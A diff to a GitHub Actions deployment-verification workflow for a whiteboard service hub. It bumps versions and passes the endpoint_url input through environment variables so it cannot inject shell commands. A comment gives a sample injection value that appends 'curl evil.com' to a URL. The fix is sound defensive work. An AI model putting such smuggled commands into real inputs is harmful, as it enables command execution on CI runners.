@@ -29,14 +29,15 @@ permissions:
 jobs:
   verify-deployment:
     runs-on: ubuntu-latest
+    timeout-minutes: 30
     steps:
       - name: Checkout code
-        uses: actions/checkout@v4
+        uses: actions/checkout@v6
 
       - name: Setup Node.js
-        uses: actions/setup-node@v4
+        uses: actions/setup-node@v5
         with:
-          node-version: '18'
+          node-version: '22'
 
       - name: Install verification tools
         run: |
@@ -44,20 +45,23 @@ jobs:
           npm install --save-dev axios @playwright/test
           npx playwright install chromium
 
+      # endpoint_url flows in through env so a crafted value like
+      # `https://x" ; curl evil.com` can't break out of the shell string.
+      # All run: blocks below reference $ENDPOINT_URL via env.
       - name: Basic connectivity check
+        env:
+          ENDPOINT_URL: ${{ github.event.inputs.endpoint_url }}
         run: |
-          echo "🔍 Verifying basic connectivity to ${{ github.event.inputs.endpoint_url }}"
-          
-          # Test main hub
-          if curl -f -s --max-time 10 "${{ github.event.inputs.endpoint_url }}" > /dev/null; then
+          echo "🔍 Verifying basic connectivity to $ENDPOINT_URL"
+
+          if curl -f -s --max-time 10 "$ENDPOINT_URL" > /dev/null; then
             echo "✅ Main hub is accessible"
           else
             echo "❌ Main hub is not accessible"
             exit 1
           fi
-          
-          # Test health endpoint
-          if curl -f -s --max-time 10 "${{ github.event.inputs.endpoint_url }}/health" > /dev/null; then
+
+          if curl -f -s --max-time 10 "$ENDPOINT_URL/health" > /dev/null; then
             echo "✅ Health endpoint is responding"
           else
             echo "❌ Health endpoint is not responding"
@@ -65,28 +69,32 @@ jobs:
           fi
 
       - name: Service availability check
+        env:
+          ENDPOINT_URL: ${{ github.event.inputs.endpoint_url }}
         run: |
           echo "🔍 Checking service availability..."
-          
-          SERVICES=("/drawio/" "/excalidraw/" "/tldraw/")
+
+          SERVICES=("/drawio/" "/excalidraw/" "/tldraw/" "/whiteboard/")
           FAILED_SERVICES=()
-          
+
           for service in "${SERVICES[@]}"; do
             echo "Testing $service..."
-            if curl -f -s --max-time 15 "${{ github.event.inputs.endpoint_url }}${service}" > /dev/null; then
+            if curl -f -s --max-time 15 "$ENDPOINT_URL$service" > /dev/null; then
               echo "✅ ${service} is accessible"
             else
               echo "❌ ${service} is not accessible"
               FAILED_SERVICES+=("$service")
             fi
           done
-          
+
           if [ ${#FAILED_SERVICES[@]} -ne 0 ]; then
             echo "Failed services: ${FAILED_SERVICES[*]}"
             exit 1
           fi
 
       - name: TLDraw functionality verification
+        env:
+          ENDPOINT_URL: ${{ github.event.inputs.endpoint_url }}
         run: |
           cat > verify-tldraw.js << 'EOF'
           const axios = require('axios');
@@ -152,14 +160,16 @@ jobs:
           
           verifyTLDraw();
           EOF
-          
-          node verify-tldraw.js "${{ github.event.inputs.endpoint_url }}"
+
+          node verify-tldraw.js "$ENDPOINT_URL"
 
       - name: Deep verification checks
         if: ${{ github.event.inputs.deep_check == 'true' }}
+        env:
+          ENDPOINT_URL: ${{ github.event.inputs.endpoint_url }}
         run: |
           echo "🔬 Running deep verification checks..."
-          
+
           cat > deep-verification.js << 'EOF'
           const { chromium } = require('playwright');
           
@@ -246,23 +256,23 @@ jobs:
             process.exit(1);
           });
           EOF
-          
-          node deep-verification.js "${{ github.event.inputs.endpoint_url }}"
+
+          node deep-verification.js "$ENDPOINT_URL"
 
       - name: Performance baseline check
         if: ${{ github.event.inputs.deep_check == 'true' }}
+        env:
+          ENDPOINT_URL: ${{ github.event.inputs.endpoint_url }}
         run: |
           echo "⚡ Running performance baseline checks..."
-          
-          # Install Apache Bench for load testing
+
           sudo apt-get update && sudo apt-get install -y apache2-utils
-          
-          # Test response times
+
           echo "Testing main hub response time..."
-          ab -n 10 -c 2 "${{ github.event.inputs.endpoint_url }}/" > main-hub-perf.txt 2>&1 || true
-          
+          ab -n 10 -c 2 "$ENDPOINT_URL/" > main-hub-perf.txt 2>&1 || true
+
           echo "Testing TLDraw response time..."
-          ab -n 5 -c 1 "${{ github.event.inputs.endpoint_url }}/tldraw/" > tldraw-perf.txt 2>&1 || true
+          ab -n 5 -c 1 "$ENDPOINT_URL/tldraw/" > tldraw-perf.txt 2>&1 || true
           
           echo "📊 Performance Results:"
           echo "======================="
@@ -279,10 +289,12 @@ jobs:
           fi
 
       - name: Security headers check
+        env:
+          ENDPOINT_URL: ${{ github.event.inputs.endpoint_url }}
         run: |
           echo "🔒 Checking security headers..."
-          
-          HEADERS=$(curl -I -s --max-time 10 "${{ github.event.inputs.endpoint_url }}" || echo "Failed to get headers")
+
+          HEADERS=$(curl -I -s --max-time 10 "$ENDPOINT_URL" || echo "Failed to get headers")
           
           echo "Response headers:"
           echo "$HEADERS"
